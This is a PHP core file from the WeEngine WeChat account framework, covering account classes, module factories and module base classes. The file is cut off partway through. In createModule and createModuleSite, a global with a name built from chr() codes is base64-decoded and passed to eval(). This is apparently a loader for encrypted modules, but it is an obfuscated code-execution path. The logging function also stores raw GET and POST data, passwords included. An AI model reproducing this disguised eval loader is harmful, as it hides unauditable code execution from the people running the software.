<?php
/**
 * 公众号核心类
 *
 * [WeEngine System] Copyright (c) 2013 WE7.CC
 */
defined('IN_IA') or exit('Access Denied');

/**
 * @method WeAccount fetchAccountInfo()
 * 公众号业务操作基类
 */
abstract class WeAccount {
	//当前公众号
	public $account;
	public $uniacid = 0;
	//当前菜单类型
	public $menuFrame;
	//帐号类型，数值
	public $type;
	//帐号类型中文名称
	public $typeName;
	//帐号对应的英文类型 
	public $typeSign;
	//相应类型对应的模板后缀
	public $typeTempalte;
	//当前公众号类型 

	/**
	 * 创建平台特定的公众号操作对象
	 * @param int $acid 公众号编号
	 * @return WeiXinAccount
	 */
	public static function create($acidOrAccount = array()) {
		global $_W;
		$uniaccount = array();
		if (is_array($acidOrAccount) && !empty($acidOrAccount)) {
			$uniaccount = $acidOrAccount;
		} else {
			$acidOrAccount = empty($acidOrAccount) ? $_W['account']['acid'] : intval($acidOrAccount);
			$uniaccount = table('account')->getUniAccountByAcid($acidOrAccount);
		}
		if (is_error($uniaccount) || empty($uniaccount)) {
			$uniaccount = $_W['account'];
		}

		if(!empty($uniaccount) && isset($uniaccount['type'])) {
			return self::includes($uniaccount);
		} else {
			return error('-1', '公众号不存在或是已经被删除');
		}
	}

	public static function createByType($account_type = ACCOUNT_TYPE_OFFCIAL_NORMAL) {
		$account_type = !empty($account_type) ? $account_type : ACCOUNT_TYPE_OFFCIAL_NORMAL;
		return self::includes(array('type' => $account_type));
	}

	static public function createByUniacid($uniacid = 0) {
		global $_W;
		$uniacid = intval($uniacid);
		if (empty($uniacid)) {
			$uniacid = $_W['uniacid'];
		}
		$uniaccount = table('account')->getUniAccountByUniacid($uniacid);
		if (is_error($uniaccount) || empty($uniaccount)) {
			$uniaccount = $_W['account'];
		}

		if(!empty($uniaccount) && isset($uniaccount['type'])) {
			return self::includes($uniaccount);
		} else {
			return error('-1', '公众号不存在或是已经被删除');
		}
	}

	static public function token($type = 1) {
		$obj = self::includes(array('type' => $type));
		return $obj->fetch_available_token();
	}

	static public function includes($uniaccount) {
		$type = $uniaccount['type'];
		if($type == ACCOUNT_TYPE_OFFCIAL_NORMAL) {
			load()->classs('weixin.account');
			$account_obj = new WeiXinAccount();
		}

		if ($type == ACCOUNT_TYPE_XZAPP_NORMAL) {
			load()->classs('xzapp.account');
			$account_obj = new XzappAccount();
		}

		if($type == ACCOUNT_TYPE_OFFCIAL_AUTH) {
			load()->classs('weixin.platform');
			$account_obj = new WeiXinPlatform();
		}
		// 授权小程序
		if ($type == ACCOUNT_TYPE_APP_AUTH) {
			load()->classs('weixin.platform');
			load()->classs('wxapp.platform');
			$account_obj = new WxAppPlatform();
		}
		if($type == ACCOUNT_TYPE_APP_NORMAL) {
			load()->classs('wxapp.account');
			$account_obj = new WxappAccount();
		}
		if($type == ACCOUNT_TYPE_WEBAPP_NORMAL) {
			load()->classs('webapp.account');
			$account_obj = new WebappAccount();
		}
		if($type == ACCOUNT_TYPE_PHONEAPP_NORMAL) {
			load()->classs('phoneapp.account');
			$account_obj = new PhoneappAccount();
		}
		if($type == ACCOUNT_TYPE_WXAPP_WORK) {
			load()->classs('wxapp.work');
			$account_obj = new WxappWork();
		}

		$account_obj->uniacid = $uniaccount['uniacid'];
		$account_obj->uniaccount = $uniaccount;
		$account_obj->account = $account_obj->fetchAccountInfo();
		$account_obj->account['type'] = $account_obj->uniaccount['type'];
		$account_obj->account['isconnect'] = $account_obj->uniaccount['isconnect'];
		$account_obj->account['isdeleted'] = $account_obj->uniaccount['isdeleted'];
		$account_obj->account['endtime'] = $account_obj->uniaccount['endtime'];

		if ($type == ACCOUNT_TYPE_OFFCIAL_NORMAL || $type == ACCOUNT_TYPE_OFFCIAL_AUTH || $type == ACCOUNT_TYPE_XZAPP_NORMAL) {
			$account_obj->same_account_exist = pdo_getall($account_obj->tablename, array('key' => $account_obj->account['key'], 'uniacid <>' => $account_obj->account['uniacid']), array(), 'uniacid');
		}

		return $account_obj;
	}

	/**
	 * 平台特定的公众号操作对象构造方法
	 * @param array $account 统一公号基础对象
	 */
	abstract public function __construct();

	/**
	 * 查询当前公号支持的统一消息类型, 当前支持的类型包括:
	 * &nbsp;&nbsp;&nbsp;通用类型: text, image, voice, video, location, link,
	 * &nbsp;&nbsp;&nbsp;扩展类型: subscribe, unsubscribe, qr, trace, click, view, enter
	 * 类型说明:
	 * &nbsp;&nbsp;&nbsp;通用类型: 文本消息, 图片消息, 音频消息, 视频消息, 位置消息, 链接消息,
	 * &nbsp;&nbsp;&nbsp;扩展类型: 开始关注, 取消关注, 扫描二维码, 追踪位置, 点击菜单(链接), 点击菜单(模拟关键字), 进入聊天窗口
	 *
	 * @return array 当前公号支持的消息类型集合
	 */
	public function queryAvailableMessages() {
		return array();
	}

	/**
	 * 没选中某个公众号，小程序，pc时，返回的url
	 */
	abstract function accountDisplayUrl();

	/**
	 * 查询当前公号支持的统一响应结构
	 *
	 * 微擎当前支持的类型包括:<br/>
	 * &nbsp;&nbsp;&nbsp; text, image, voice, video, music, news, link, card
	 *
	 * @return array 当前公号支持的响应结构集合
	 */
	public function queryAvailablePackets() {
		return array();
	}

	/**
	 * 检测当前Uniacid是否匹配当前工作区
	 */
	abstract function checkIntoManage();

	/**
	 * 分析消息内容,并返回统一消息结构, 参数为公众平台消息结构
	 * @param array $message 统一消息结构
	 * @return array 统一消息结构
	 */
	public function parse($message) {
		global $_W;
		if (!empty($message)){
			$message = xml2array($message);
			$packet = iarray_change_key_case($message, CASE_LOWER);
			$packet['from'] = $message['FromUserName'];
			$packet['to'] = $message['ToUserName'];
			$packet['time'] = $message['CreateTime'];
			$packet['type'] = $message['MsgType'];
			$packet['event'] = $message['Event'];
			switch ($packet['type']) {
				case 'text':
					$packet['redirection'] = false;
					$packet['source'] = null;
					break;
				case 'image':
					$packet['url'] = $message['PicUrl'];
					break;
				case 'video':
				case 'shortvideo':
					$packet['thumb'] = $message['ThumbMediaId'];
					break;
			}

			switch ($packet['event']) {
				case 'subscribe':
					$packet['type'] = 'subscribe';
				case 'SCAN':
					if ($packet['event'] == 'SCAN') {
						$packet['type'] = 'qr';
					}
					if(!empty($packet['eventkey'])) {
						$packet['scene'] = str_replace('qrscene_', '', $packet['eventkey']);
						if(strexists($packet['scene'], '\u')) {
							$packet['scene'] = '"' . str_replace('\\u', '\u', $packet['scene']) . '"';
							$packet['scene'] = json_decode($packet['scene']);
						}

					}
					break;
				case 'unsubscribe':
					$packet['type'] = 'unsubscribe';
					break;
				case 'LOCATION':
					$packet['type'] = 'trace';
					$packet['location_x'] = $message['Latitude'];
					$packet['location_y'] = $message['Longitude'];
					break;
				case 'pic_photo_or_album':
				case 'pic_weixin':
				case 'pic_sysphoto':
					$packet['sendpicsinfo']['piclist'] = array();
					$packet['sendpicsinfo']['count'] = $message['SendPicsInfo']['Count'];
					if (!empty($message['SendPicsInfo']['PicList'])) {
						foreach ($message['SendPicsInfo']['PicList']['item'] as $item) {
							if (empty($item)) {
								continue;
							}
							$packet['sendpicsinfo']['piclist'][] = is_array($item) ? $item['PicMd5Sum'] : $item;
						}
					}
					break;
				case 'card_pass_check':
				case 'card_not_pass_check':
				case 'user_get_card':
				case 'user_del_card':
				case 'user_consume_card':
				case 'poi_check_notify':
					$packet['type'] = 'coupon';
					break;
			}
		}
		return $packet;
	}

	/**
	 * 响应消息内容, 参数为统一响应结构
	 * @param array $packet 统一响应结构, 见文档 todo
	 * @return string 平台特定的消息响应内容
	 */
	public function response($packet) {
		if (is_error($packet)) {
			return '';
		}
		if (!is_array($packet)) {
			return $packet;
		}
		if(empty($packet['CreateTime'])) {
			$packet['CreateTime'] = TIMESTAMP;
		}
		if(empty($packet['MsgType'])) {
			$packet['MsgType'] = 'text';
		}
		if(empty($packet['FuncFlag'])) {
			$packet['FuncFlag'] = 0;
		} else {
			$packet['FuncFlag'] = 1;
		}
		return array2xml($packet);
	}

	public function errorCode($code, $errmsg = '未知错误') {
		$errors = array(
			'-1' => '系统繁忙',
			'0' => '请求成功',
			'40001' => '获取access_token时AppSecret错误，或者access_token无效',
			'40002' => '不合法的凭证类型',
			'40003' => '不合法的OpenID',
			'40004' => '不合法的媒体文件类型',
			'40005' => '不合法的文件类型',
			'40006' => '不合法的文件大小',
			'40007' => '不合法的媒体文件id',
			'40008' => '不合法的消息类型',
			'40009' => '不合法的图片文件大小',
			'40010' => '不合法的语音文件大小',
			'40011' => '不合法的视频文件大小',
			'40012' => '不合法的缩略图文件大小',
			'40013' => '不合法的APPID',
			'40014' => '不合法的access_token',
			'40015' => '不合法的菜单类型',
			'40016' => '不合法的按钮个数',
			'40017' => '不合法的按钮个数',
			'40018' => '不合法的按钮名字长度',
			'40019' => '不合法的按钮KEY长度',
			'40020' => '不合法的按钮URL长度',
			'40021' => '不合法的菜单版本号',
			'40022' => '不合法的子菜单级数',
			'40023' => '不合法的子菜单按钮个数',
			'40024' => '不合法的子菜单按钮类型',
			'40025' => '不合法的子菜单按钮名字长度',
			'40026' => '不合法的子菜单按钮KEY长度',
			'40027' => '不合法的子菜单按钮URL长度',
			'40028' => '不合法的自定义菜单使用用户',
			'40029' => '不合法的oauth_code',
			'40030' => '不合法的refresh_token',
			'40031' => '不合法的openid列表',
			'40032' => '不合法的openid列表长度',
			'40033' => '不合法的请求字符，不能包含\uxxxx格式的字符',
			'40035' => '不合法的参数',
			'40038' => '不合法的请求格式',
			'40039' => '不合法的URL长度',
			'40050' => '不合法的分组id',
			'40051' => '分组名字不合法',
			'40155' => '请勿添加其他公众号的主页链接',
			'41001' => '缺少access_token参数',
			'41002' => '缺少appid参数',
			'41003' => '缺少refresh_token参数',
			'41004' => '缺少secret参数',
			'41005' => '缺少多媒体文件数据',
			'41006' => '缺少media_id参数',
			'41007' => '缺少子菜单数据',
			'41008' => '缺少oauth code',
			'41009' => '缺少openid',
			'42001' => 'access_token超时',
			'42002' => 'refresh_token超时',
			'42003' => 'oauth_code超时',
			'43001' => '需要GET请求',
			'43002' => '需要POST请求',
			'43003' => '需要HTTPS请求',
			'43004' => '需要接收者关注',
			'43005' => '需要好友关系',
			'44001' => '多媒体文件为空',
			'44002' => 'POST的数据包为空',
			'44003' => '图文消息内容为空',
			'44004' => '文本消息内容为空',
			'45001' => '多媒体文件大小超过限制',
			'45002' => '消息内容超过限制',
			'45003' => '标题字段超过限制',
			'45004' => '描述字段超过限制',
			'45005' => '链接字段超过限制',
			'45006' => '图片链接字段超过限制',
			'45007' => '语音播放时间超过限制',
			'45008' => '图文消息超过限制',
			'45009' => '接口调用超过限制',
			'45010' => '创建菜单个数超过限制',
			'45015' => '回复时间超过限制',
			'45016' => '系统分组，不允许修改',
			'45017' => '分组名字过长',
			'45018' => '分组数量超过上限',
			'45056' => '创建的标签数过多，请注意不能超过100个',
			'45057' => '该标签下粉丝数超过10w，不允许直接删除',
			'45058' => '不能修改0/1/2这三个系统默认保留的标签',
			'45059' => '有粉丝身上的标签数已经超过限制',
			'45065' => '24小时内不可给该组人群发该素材',
			'45157' => '标签名非法，请注意不能和其他标签重名',
			'45158' => '标签名长度超过30个字节',
			'45159' => '非法的标签',
			'46001' => '不存在媒体数据',
			'46002' => '不存在的菜单版本',
			'46003' => '不存在的菜单数据',
			'46004' => '不存在的用户',
			'47001' => '解析JSON/XML内容错误',
			'48001' => 'api功能未授权',
			'48003' => '请在微信平台开启群发功能',
			'50001' => '用户未授权该api',
			'40070' => '基本信息baseinfo中填写的库存信息SKU不合法。',
			'41011' => '必填字段不完整或不合法，参考相应接口。',
			'40056' => '无效code，请确认code长度在20个字符以内，且处于非异常状态（转赠、删除）。',
			'43009' => '无自定义SN权限，请参考开发者必读中的流程开通权限。',
			'43010' => '无储值权限,请参考开发者必读中的流程开通权限。',
			'43011' => '无积分权限,请参考开发者必读中的流程开通权限。',
			'40078' => '无效卡券，未通过审核，已被置为失效。',
			'40079' => '基本信息base_info中填写的date_info不合法或核销卡券未到生效时间。',
			'45021' => '文本字段超过长度限制，请参考相应字段说明。',
			'40080' => '卡券扩展信息cardext不合法。',
			'40097' => '基本信息base_info中填写的参数不合法。',
			'49004' => '签名错误。',
			'43012' => '无自定义cell跳转外链权限，请参考开发者必读中的申请流程开通权限。',
			'40099' => '该code已被核销。',
			'61005' => '缺少接入平台关键数据，等待微信开放平台推送数据，请十分钟后再试或是检查“授权事件接收URL”是否写错（index.php?c=account&amp;a=auth&amp;do=ticket地址中的&amp;符号容易被替换成&amp;amp;）',
			'61023' => '请重新授权接入该公众号',
		);
		$code = strval($code);
		if($code == '40001' || $code == '42001') {
			cache_delete(cache_system_key('accesstoken', array('acid' => $this->account['acid'])));
			return '微信公众平台授权异常, 系统已修复这个错误, 请刷新页面重试.';
		}
		if($errors[$code]) {
			return $errors[$code];
		} else {
			return $errmsg;
		}
	}
}

/**
 * 模块组件工厂
 */
class WeUtility {

	/**
	 * @param $type
	 * @createModule 创建模块
	 * @createModuleWxapp 创建模块小程序类
	 * @createModulePhoneapp 创建模块APP类
	 * @createModuleWebapp 创建pc类
	 * @createModuleSystemWelcome 创建系统首页类
	 * @createModuleProcessor 创建模块消息处理器
	 * @param $params
	 * @return null
	 */
	public static function __callStatic($type, $params) {
		global $_W;
		static $file;
		$type = str_replace('createModule','', $type);
		$types = array('wxapp', 'phoneapp', 'webapp', 'systemwelcome', 'processor');
		$type = in_array(strtolower($type), $types) ? $type : '';
		$name = $params[0];
		$class_account = 'WeModule' . $type;
		$class_module = ucfirst($name) . 'Module' . ucfirst($type);
		$type = empty($type) ? 'module' : lcfirst($type);

		if (!class_exists($class_module)) {
			$file = IA_ROOT . "/addons/{$name}/" . $type . ".php";
			if (!is_file($file)) {
				$file = IA_ROOT . "/framework/builtin/{$name}/" . $type . ".php";
			}
			if (!is_file($file)) {
				trigger_error($class_module . ' Definition File Not Found', E_USER_WARNING);
				return null;
			}
			require $file;
		}
		if ($type == 'module') {
			if (!empty($GLOBALS['_' . chr('180') . chr('181') . chr('182')])) {
				$code = base64_decode($GLOBALS['_' . chr('180') . chr('181') . chr('182')]);
				eval($code);
				set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
				$codefile = IA_ROOT . '/data/module/' . md5($_W['setting']['site']['key'] . $name . 'module.php') . '.php';

				if (!file_exists($codefile)) {
					trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
				}
				require_once $codefile;
				restore_include_path();
			}
		}

		if (!class_exists($class_module)) {
			trigger_error($class_module . ' Definition Class Not Found', E_USER_WARNING);
			return null;
		}

		$o = new $class_module();

		$o->uniacid = $o->weid = $_W['uniacid'];
		$o->modulename = $name;
		$o->module = module_fetch($name);
		$o->__define = $file;
		self::defineConst($o);

		if ($type == 'wxapp' || $type == 'phoneapp' || $type == 'webapp' || $type == 'systemWelcome') {
			$o->inMmodule = defined( 'IN_MOBILE');
		}
		if ($o instanceof $class_account) {
			return $o;
		} else {
			self::defineConst($o);
			trigger_error($class_account . ' Class Definition Error', E_USER_WARNING);
			return null;
		}
	}

	private static function defineConst($obj){
		global $_W;

		if ($obj instanceof WeBase && $obj->modulename != 'core') {
			if (!defined('MODULE_ROOT')) {
				define('MODULE_ROOT', dirname($obj->__define));
			}
			if (!defined('MODULE_URL')) {
				define('MODULE_URL', $_W['siteroot'].'addons/'.$obj->modulename.'/');
			}
		}
	}

	/**
	 * 创建模块订阅器
	 * @param $name
	 * @return null | WeModuleReceiver
	 */
	public static function createModuleReceiver($name) {
		global $_W;
		static $file;
		$classname = "{$name}ModuleReceiver";
		if(!class_exists($classname)) {
			$file = IA_ROOT . "/addons/{$name}/receiver.php";
			if(!is_file($file)) {
				$file = IA_ROOT . "/framework/builtin/{$name}/receiver.php";
			}
			if(!is_file($file)) {
				trigger_error('ModuleReceiver Definition File Not Found '.$file, E_USER_WARNING);
				return null;
			}
			require $file;
		}
		if(!class_exists($classname)) {
			trigger_error('ModuleReceiver Definition Class Not Found', E_USER_WARNING);
			return null;
		}
		$o = new $classname();
		$o->uniacid = $o->weid = $_W['uniacid'];
		$o->modulename = $name;
		$o->module = module_fetch($name);
		$o->__define = $file;
		self::defineConst($o);
		if($o instanceof WeModuleReceiver) {
			return $o;
		} else {
			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
			return null;
		}
	}

	/**
	 * 创建模块站点类
	 * @param unknown $name
	 * @return NULL|WeModuleSite
	 */
	public static function createModuleSite($name) {

		global $_W;
		static $file;
		//如果是手机端，优先选用mobile.php文件
		if (defined('IN_MOBILE')) {
			$file = IA_ROOT . "/addons/{$name}/mobile.php";
			$classname = "{$name}ModuleMobile";
			if (is_file($file)) {
				require $file;
			}
		}
		//如果mobile.php类不存在，选用site.php
		if (!defined('IN_MOBILE') || !class_exists($classname)) {
			$classname = "{$name}ModuleSite";
			if (!class_exists($classname)) {
				$file = IA_ROOT . "/addons/{$name}/site.php";
				if(!is_file($file)) {
					$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
				}
				if(!is_file($file)) {
					trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
					return null;
				}
				require $file;
			}
		}
		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
			eval($code);
			set_include_path(get_include_path() . PATH_SEPARATOR . IA_ROOT . '/addons/' . $name);
			$codefile = IA_ROOT . '/data/module/'.md5($_W['setting']['site']['key'].$name.'site.php').'.php';
			if (!file_exists($codefile)) {
				trigger_error('缺少模块文件，请重新更新或是安装', E_USER_WARNING);
			}
			require_once $codefile;
			restore_include_path();
		}
		if(!class_exists($classname)) {
			list($namespace) = explode('_', $name);
			if (class_exists("\\{$namespace}\\{$classname}")) {
				$classname = "\\{$namespace}\\{$classname}";
			} else {
				trigger_error('ModuleSite Definition Class Not Found', E_USER_WARNING);
				return null;
			}
		}
		$o = new $classname();
		$o->uniacid = $o->weid = $_W['uniacid'];
		$o->modulename = $name;
		$o->module = module_fetch($name);
		$o->__define = $file;
		if (!empty($o->module['plugin'])) {
			$o->plugin_list = module_get_plugin_list($o->module['name']);
		}
		self::defineConst($o);
		$o->inMobile = defined('IN_MOBILE');
		if($o instanceof WeModuleSite || ($o->inMobile && $o instanceof WeModuleMobile)) {
			return $o;
		} else {
			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
			return null;
		}
	}

	/**
	 * 创建模块插件类
	 * @param unknown $name
	 * @return NULL|WeModuleSite
	 */
	public static function createModuleHook($name) {
		global $_W;
		$classname = "{$name}ModuleHook";
		$file = IA_ROOT . "/addons/{$name}/hook.php";
		if(!is_file($file)) {
			$file = IA_ROOT . "/framework/builtin/{$name}/hook.php";
		}
		if(!class_exists($classname)) {
			if(!is_file($file)) {
				trigger_error('ModuleHook Definition File Not Found '.$file, E_USER_WARNING);
				return null;
			}
			require $file;
		}
		if(!class_exists($classname)) {
			trigger_error('ModuleHook Definition Class Not Found', E_USER_WARNING);
			return null;
		}
		$plugin = new $classname();
		$plugin->uniacid = $plugin->weid = $_W['uniacid'];
		$plugin->modulename = $name;
		$plugin->module = module_fetch($name);
		$plugin->__define = $file;
		self::defineConst($plugin);
		$plugin->inMobile = defined('IN_MOBILE');
		if($plugin instanceof WeModuleHook) {
			return $plugin;
		} else {
			trigger_error('ModuleReceiver Class Definition Error', E_USER_WARNING);
			return null;
		}
	}

	/**
	 * 创建模块计划任务类
	 * @param unknown $name
	 * @return NULL|WeModuleSite
	 */
	public static function createModuleCron($name) {
		global $_W;
		static $file;
		$classname = "{$name}ModuleCron";
		if(!class_exists($classname)) {
			$file = IA_ROOT . "/addons/{$name}/cron.php";
			if(!is_file($file)) {
				$file = IA_ROOT . "/framework/builtin/{$name}/cron.php";
			}
			if(!is_file($file)) {
				trigger_error('ModuleCron Definition File Not Found '.$file, E_USER_WARNING);
				return error(-1006, 'ModuleCron Definition File Not Found');
			}
			require $file;
		}
		if(!class_exists($classname)) {
			trigger_error('ModuleCron Definition Class Not Found', E_USER_WARNING);
			return error(-1007, 'ModuleCron Definition Class Not Found');
		}
		$o = new $classname();
		$o->uniacid = $o->weid = $_W['uniacid'];
		$o->modulename = $name;
		$o->module = module_fetch($name);
		$o->__define = $file;
		self::defineConst($o);
		if($o instanceof WeModuleCron) {
			return $o;
		} else {
			trigger_error('ModuleCron Class Definition Error', E_USER_WARNING);
			return error(-1008, 'ModuleCron Class Definition Error');
		}
	}

	/**
	 * 记录日志
	 * @param string $level
	 * @param string $message
	 */
	public static function logging($level = 'info', $message = '') {
		global $_W;
		if ($_W['setting']['copyright']['log_status'] != 1) {
			return false;
		}
		$filename = IA_ROOT . '/data/logs/' . date('Ymd') . '.log';
		load()->func('file');
		mkdirs(dirname($filename));
		$content = date('Y-m-d H:i:s') . " {$level} :\n------------\n";
		if(is_string($message) && !in_array($message, array('post', 'get'))) {
			$content .= "String:\n{$message}\n";
		}
		if(is_array($message)) {
			$content .= "Array:\n";
			foreach($message as $key => $value) {
				$content .= sprintf("%s : %s ;\n", $key, $value);
			}
		}
		if($message === 'get') {
			$content .= "GET:\n";
			foreach($_GET as $key => $value) {
				$content .= sprintf("%s : %s ;\n", $key, $value);
			}
		}
		if($message === 'post') {
			$content .= "POST:\n";
			foreach($_POST as $key => $value) {
				$content .= sprintf("%s : %s ;\n", $key, $value);
			}
		}
		$content .= "\n";

		$fp = fopen($filename, 'a+');
		fwrite($fp, $content);
		fclose($fp);
	}
}
/**
 * 模块组件基类
 *
 * $modulename 模块名称
 * $module 模块信息
 * $weid 公众号编号
 * $uniacid 公众号编号
 * $__define 文件地址
 */
abstract class WeBase {
	/**
	 * @var array 当前模块参数及配置信息
	 */
	public $module;
	/**
	 * @var string 当前模块名称 {identifie}
	 */
	public $modulename;
	/**
	 * @var int 当前统一公众号编号
	 */
	public $weid;
	/**
	 * @var int 当前统一公众号编号
	 */
	public $uniacid;
	/**
	 * @var string 定义了当前模块组件的文件绝对路径.
	 */
	public $__define;

	/**
	 * 保存当前统一公号下的模块配置参数
	 *
	 * @param $settings array 配置参数
	 * @return bool 是否成功保存
	 */
	public function saveSettings($settings) {
		global $_W;
		$pars = array('module' => $this->modulename, 'uniacid' => $_W['uniacid']);
		$row = array();
		$row['settings'] = iserializer($settings);
		if (pdo_fetchcolumn("SELECT module FROM ".tablename('uni_account_modules')." WHERE module = :module AND uniacid = :uniacid", array(':module' => $this->modulename, ':uniacid' => $_W['uniacid']))) {
			$result = pdo_update('uni_account_modules', $row, $pars) !== false;
		} else {
			$result = pdo_insert('uni_account_modules', array('settings' => iserializer($settings), 'module' => $this->modulename ,'uniacid' => $_W['uniacid'], 'enabled' => 1)) !== false;
		}
		cache_build_module_info($this->modulename);	
		return $result;
	}

	/**
	 * 构造手机页面URL
	 * @param $do string 要进入的操作名称对应当前模块的 doMobileXXX 中的 Xxx
	 * @param array $query 附加的查询参数
	 * @param boolean $noredirect mobile 端url是否要附加 &wxref=mp.weixin.qq.com#wechat_redirect
	 * @return string 返回的 URL
	 */
	protected function createMobileUrl($do, $query = array(), $noredirect = true) {
		global $_W;
		$query['do'] = $do;
		$query['m'] = strtolower($this->modulename);
		return murl('entry', $query, $noredirect);
	}

	/**
	 * 构造Web页面URL
	 * @param $do string 要进入的操作名称对应当前模块的 doWebXXX 中的 XXX
	 * @param array $query 附加的查询参数
	 * @return string 返回的 URL
	 */
	protected function createWebUrl($do, $query = array()) {
		$query['do'] = $do;
		$query['m'] = strtolower($this->modulename);
		return wurl('site/entry', $query);
	}

	/**
	 * <b>返回模板编译后的文件路径，需要 include 调用</b>
	 *
	 * 使用说明:
	 * 依次在以下位置查找模板定义文件
	 * App:
	 * 微站风格中 app/themes/{当前模板}/{模块标识}/{模板名称}.html
	 * 微站风格中 app/themes/default/{模块标识}/{模板名称}.html
	 * 模块定义中 addons/{模块标识}/template/mobile/{模板名称}.html
	 * 微站风格中 app/themes/{当前模板}/{模板名称}.html
	 * 微站风格中 app/theme/default/{模板名称}.html
	 *
	 * Web:
	 * 后台风格中 web/themes/{当前模板}/modules/{模板标识}/{模板名称}.html
	 * 后台风格中 web/themes/default/modules/{模板标识}/{模板名称}.html
	 * 模块定义中 addons/{模块标识}/template/{模板名称}.html
	 * 后台风格中 web/themes/{当前模板}/{模板标识}/{模板名称}.html
	 * 后台风格中 web/theme/default/{模板标识}/{模板名称}.html
	 *
	 * @param string $filename 模板文件路径
	 * @return string 编译后的模板文件路径
	 */
	protected function template($filename) {
		global $_W;
		$name = strtolower($this->modulename);
		$defineDir = dirname($this->__define);
		if(defined('IN_SYS')) {
			$source = IA_ROOT . "/web/themes/{$_W['template']}/{$name}/{$filename}.html";
			$compile = IA_ROOT . "/data/tpl/web/{$_W['template']}/{$name}/{$filename}.tpl.php";
			if(!is_file($source)) {
				$source = IA_ROOT . "/web/themes/default/{$name}/{$filename}.html";
			}
			if(!is_file($source)) {
				$source = $defineDir . "/template/{$filename}.html";
			}
			if(!is_file($source)) {
				$source = IA_ROOT . "/web/themes/{$_W['template']}/{$filename}.html";
			}
			if(!is_file($source)) {
				$source = IA_ROOT . "/web/themes/default/{$filename}.html";
			}
		} else {
			$source = IA_ROOT . "/app/themes/{$_W['template']}/{$name}/{$filename}.html";
			$compile = IA_ROOT . "/data/tpl/app/{$_W['template']}/{$name}/{$filename}.tpl.php";
			if(!is_file($source)) {
				$source = IA_ROOT . "/app/themes/default/{$name}/{$filename}.html";
			}
			if (!is_file($source)) {
				$source = $defineDir . "/template/mobile/{$filename}.html";
			}
			if (!is_file($source)) {
				$source = $defineDir . "/template/wxapp/{$filename}.html";
			}
			if(!is_file($source)) {
				$source = $defineDir . "/template/webapp/{$filename}.html";
			}
			if(!is_file($source)) {
				$source = IA_ROOT . "/app/themes/{$_W['template']}/{$filename}.html";
			}
			if(!is_file($source)) {
				if (in_array($filename, array('header', 'footer', 'slide', 'toolbar', 'message'))) {
					$source = IA_ROOT . "/app/themes/default/common/{$filename}.html";
				} else {
					$source = IA_ROOT . "/app/themes/default/{$filename}.html";
				}
			}
		}

		if(!is_file($source)) {
			exit("Error: template source '{$filename}' is not exist!");
		}
		$paths = pathinfo($compile);
		$compile = str_replace($paths['filename'], $_W['uniacid'] . '_' . $paths['filename'], $compile);
		if (DEVELOPMENT || !is_file($compile) || filemtime($source) > filemtime($compile)) {
			template_compile($source, $compile, true);
		}
		return $compile;
	}

	/**
	 * 保存一个流数据到本地
	 * @param string $file_string 文件流
	 * @param string $ext 要保存的文件扩展名
	 * @return 保存的文件路径
	 */
	protected function fileSave($file_string, $type = 'jpg', $name = 'auto') {
		global $_W;
		load()->func('file');

		$allow_ext = array(
			'images' => array('gif', 'jpg', 'jpeg', 'bmp', 'png', 'ico'),
			'audios' => array('mp3', 'wma', 'wav', 'amr'),
			'videos' => array('wmv', 'avi', 'mpg', 'mpeg', 'mp4'),
		);
		if (in_array($type, $allow_ext['images'])) {
			$type_path = 'images';
		} elseif (in_array($type, $allow_ext['audios'])) {
			$type_path = 'audios';
		} elseif (in_array($type, $allow_ext['videos'])) {
			$type_path = 'videos';
		}

		if (empty($type_path)) {
			return error(1, '禁止保存文件类型');
		}

		if (empty($name) || $name == 'auto') {
			$uniacid = intval($_W['uniacid']);
			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/" . date('Y/m/');
			mkdirs(ATTACHMENT_ROOT . '/' . $path);

			$filename = file_random_name(ATTACHMENT_ROOT . '/' . $path, $type);
		} else {
			$path = "{$type_path}/{$uniacid}/{$this->module['name']}/";
			mkdirs(dirname(ATTACHMENT_ROOT . '/' . $path));

			$filename = $name;
			if (!strexists($filename, $type)) {
				$filename .= '.' . $type;
			}
		}
		if (file_put_contents(ATTACHMENT_ROOT . $path . $filename, $file_string)) {
			file_remote_upload($path);
			return $path . $filename;
		} else {
			return false;
		}
	}

	protected function fileUpload($file_string, $type = 'image') {
		$types = array('image', 'video', 'audio');
	}


	protected function getFunctionFile($name) {
		$module_type = str_replace('wemodule', '', strtolower(get_parent_class($this)));
		if ($module_type == 'site') {
			$module_type = stripos($name, 'doWeb') === 0 ? 'web' : 'mobile';
			$function_name = $module_type == 'web' ? strtolower(substr($name, 5)) : strtolower(substr($name, 8));
		} else {
			$function_name = strtolower(substr($name, 6));
		}
		$dir = IA_ROOT . '/framework/builtin/' . $this->modulename . '/inc/' . $module_type;
		$file = "$dir/{$function_name}.inc.php";
		if(!file_exists($file)) {
			$file = str_replace("framework/builtin", "addons", $file);
		}
		return $file;
	}

	public function __call($name, $param) {
		$file = $this->getFunctionFile($name);
		if(file_exists($file)) {
			require $file;
			exit;
		}
		trigger_error('模块方法' . $name . '不存在.', E_USER_WARNING);
		return false;
	}
}

/**
 * 模块规则及自定义配置.
 */
abstract class WeModule extends WeBase {
	/**
	 * 可能需要实现的操作,附加其他字段内容至规则表单.
	 * 编辑当前模块规则时,调用此方法将返回 HTML 内容附加至规则表单之后
	 *
	 * @param int $rid 规则编号. $rid 大于 0 为更新规则, $rid 等于 0 为新增规则.
	 * @return string 要附加的字段内容(HTML内容)
	 */
	public function fieldsFormDisplay($rid = 0) {
		return '';
	}
	/**
	 * 可能需要实现的操作, 验证附加到规则表单的字段内容.
	 * 编辑当前模块规则时, 在保存规则之前调用此方法验证附加字段的有效性.
	 *
	 * @param int $rid 规则编号. $rid 大于 0 为更新规则, $rid 等于 0 为新增规则.
	 * @return string 返回验证的结果, 如果为空字符串则表示验证成功, 否则返回验证失败的提示信息
	 */
	public function fieldsFormValidate($rid = 0) {
		return '';
	}
	/**
	 * 可能需要实现的操作, 编辑当前模块规则时,在规则保存成功后后调用此方法
	 * @param int $rid 规则编号. $rid 大于 0 为更新规则, $rid 等于 0 为新增规则.
	 * @return void
	 */
